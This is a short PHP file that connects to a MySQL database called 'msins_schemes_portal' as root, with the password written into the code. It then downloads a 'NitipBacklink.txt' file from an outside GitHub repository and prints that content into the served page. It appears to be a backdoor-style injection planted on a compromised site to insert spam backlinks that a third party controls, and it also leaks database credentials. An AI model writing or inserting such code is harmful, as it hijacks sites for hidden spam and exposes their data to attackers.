<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$ch = curl_init($url);
$con = mysqli_connect("localhost", "root", "ST_msins@12345", "msins_schemes_portal");
date_default_timezone_set("Asia/kolkata");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>
